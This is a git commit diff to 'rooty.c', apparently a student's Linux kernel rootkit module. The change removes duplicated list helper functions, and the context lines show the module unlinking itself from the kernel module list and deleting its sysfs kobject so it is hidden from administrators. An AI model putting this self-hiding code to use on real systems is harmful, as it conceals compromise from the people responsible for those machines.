a226e58ae8e129d9e887d0833f9481a0de03848c
des <sachedes@students.zhaw.ch>
2014-06-18 14:45:16 +0200

    2nd try

--- rooty.c
+++ rooty.c
@@ -8,18 +8,6 @@ void rooty_exit(void);
 module_init(rooty_init);
 module_exit(rooty_exit);
 
-  static inline void __list_del(struct list_head * prev, struct list_head * next)
-  {
-  next->prev = prev;
-  prev->next = next;
-  }
-  
-  static inline void INIT_LIST_HEAD(struct list_head *list)
-  {
-  list->next = list;
-  list->prev = list;
-  }
-
 int rooty_init(void) {
   list_del_init(&__this_module.list);
   kobject_del(&THIS_MODULE->mkobj.kobj);
